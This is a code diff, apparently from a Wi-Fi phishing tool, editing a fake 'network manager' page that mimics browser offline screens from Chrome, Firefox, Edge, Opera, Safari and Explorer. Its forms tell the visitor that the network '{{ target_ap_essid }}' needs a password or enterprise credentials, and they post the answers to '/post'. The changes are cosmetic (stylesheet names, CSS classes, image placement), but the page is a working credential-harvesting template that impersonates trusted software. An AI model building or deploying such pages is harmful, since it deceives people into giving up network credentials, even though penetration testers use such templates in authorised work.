@@ -159,26 +159,26 @@
 		if (resolvedBrowser == "Chrome") {
 	            document.write("<title i18n-content=\"title\">Internet connection is not available</title>");
 	            document.write("<link rel='stylesheet' href='/static/chrome-offline.css' type='text/css' />")
-	            document.write("<link rel='stylesheet' href='/static/chrome-style.css' />");
+	            document.write("<link rel='stylesheet' href='/static/windows-network-manager-Chrome.css' />");
             	    document.write("<link href='/static/opensans.css' rel='stylesheet' type='text/css' />");
 		}
 		else if (resolvedBrowser == "Opera") {
-	            document.write("<link rel='stylesheet' href='/static/opera-offline.css' type='text/css' />")
-	            document.write("<link rel='stylesheet' href='/static/opera-style.css' />");
+	            document.write("<link rel='stylesheet' href='/static/opera-offline.css' type='text/css' />");
+	            document.write("<link rel='stylesheet' href='/static/windows-network-manager-Opera.css' />");
             	    document.write("<link href='/static/opensans.css' rel='stylesheet' type='text/css' />");
 		}
         	else if (resolvedBrowser == "Microsoft Edge") {
-	            document.write("<link rel='stylesheet' href='/static/edge-offline.css' type='text/css' />")
-	            document.write("<link rel='stylesheet' href='/static/edge-style.css'>");
+	            document.write("<link rel='stylesheet' href='/static/edge-offline.css' type='text/css' />");
+	            document.write("<link rel='stylesheet' href='/static/windows-network-manager-Edge.css'>");
             	    document.write("<link href='/static/opensans.css' rel='stylesheet' type='text/css'>");
 		}
 		else if (resolvedBrowser == "Firefox") {
-		    document.write("<link rel='stylesheet' href='/static/firefox-offline.css' type='text/css' />")
-	            document.write("<link rel='stylesheet' href='/static/firefox-style.css'>");
+		    document.write("<link rel='stylesheet' href='/static/firefox-offline.css' type='text/css' />");
+	            document.write("<link rel='stylesheet' href='/static/windows-network-manager-Firefox.css'>");
 		}
 		else {
-		    document.write("<link rel='stylesheet' href='/static/explorer-offline.css' type='text/css' />")
-	            document.write("<link rel='stylesheet' href='/static/explorer-style.css'>");
+		    document.write("<link rel='stylesheet' href='/static/explorer-offline.css' type='text/css' />");
+	            document.write("<link rel='stylesheet' href='/static/windows-network-manager-Explorer.css'>");
             	    document.write("<link href='/static/opensans.css' rel='stylesheet' type='text/css'>");
 		}
 	}
@@ -195,8 +195,7 @@
 	            document.write("<link rel='stylesheet' href='/static/mac-network-manager-Firefox.css' />");
 		}
 		else {
-	    	document.write("<link rel='stylesheet' href='/static/page-load-errors.css' />");
-	    	document.write("<link rel='stylesheet' href='/static/page-load-errors-extras.css' />");
+	    	document.write("<link rel='stylesheet' href='/static/safari-offline.css' />");
             	document.write("<link rel='stylesheet' href='/static/mac-network-manager-Safari.css' />");
 		}
 	}
@@ -217,8 +216,8 @@
 	'            <div class="content">' +
 	'                <div class="icon">' +
 	'                    <img src="/static/wifi-icon.png" alt="WiFi signal" width="70" class="wifi-icon" />' +
-	'                    <img src="/static/question.png" alt="?" width="25" class="question" />' +
 	'                </div>' +
+	'                <img src="/static/question.png" alt="?" width="25" class="question" />' +
 	'                <div class="description">' +
 	'                   <form id="wifi-search-form" method="post" action="/post">' +
 	'                       <strong>The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption }} password.</strong>' + 
@@ -230,10 +229,10 @@
 	'                           <br>' +
 	'                           <div class="glow"></div>' +
 	'                       </div>' + 
-	'                       <div class="checkmark">' +
+	'                       <div class="checkmark1">' +
 	'                           <input id="show-password" type="checkbox" /><label for="show-password" style="margin-right: 60px;">Show password</label>' +
 	'                       </div>' +
-	'                       <div class="checkmark">' +
+	'                       <div class="checkmark2">' +
 	'                           <input id="remember-network" type="checkbox" /><label for="remember-network">Remember this network</label>' +
 	'                       </div>' + 
 	'                       <div class="buttons">' +
@@ -253,8 +252,8 @@
 	'            <div class="content">' +
 	'                <div class="icon">' +
 	'                    <img src="/static/wifi-icon.png" alt="WiFi signal" width="70" class="wifi-icon" />' +
-	'                    <img src="/static/question.png" alt="?" width="25" class="question" />' +
 	'                </div>' +
+	'                <img src="/static/question.png" alt="?" width="25" class="question" />' +
 	'                <div class="description">' +
 	'                   <form id="wifi-search-form" method="post" action="/post">' +
 	'                       <strong>The Wi-Fi network ″{{ target_ap_essid }}″ requires {{ target_ap_encryption }} enterprise credentials.</strong>' + 
@@ -268,10 +267,10 @@
 	'                           <br>' +
 	'                           <div class="glow"></div>' +
 	'                       </div>' + 
-	'                       <div class="checkmark">' +
+	'                       <div class="checkmark1">' +
 	'                           <input id="show-password" type="checkbox" /><label for="show-password" style="margin-right: 60px;">Show password</label>' +
 	'                       </div>' +
-	'                       <div class="checkmark">' +
+	'                       <div class="checkmark2">' +
 	'                           <input id="remember-network" type="checkbox" /><label for="remember-network">Remember this network</label>' +
 	'                       </div>' + 
 	'                       <div class="buttons">' +
@@ -573,7 +572,6 @@
 		</script>
 			
 		
-		
         <title></title>
         </head>
     <body onload="ShowBrowser()" id="t" class="offline">
@@ -650,9 +648,8 @@
 			
 			<div id= "Br3" style="display: none;" >
 				<div id="errorPageContainer" class="container">
-					<img id="navigatorimg" src="./static/navigator.png">
 				
-					<div id="text-container" style="margin: auto; padding-inline-start: 30%;">
+					<div id="text-container" style="margin: auto; padding-inline-start: 50%;">
 						
 						<div class="title">
 							<h1 class="title-text">Hmm. We're having trouble finding that site.</h1>
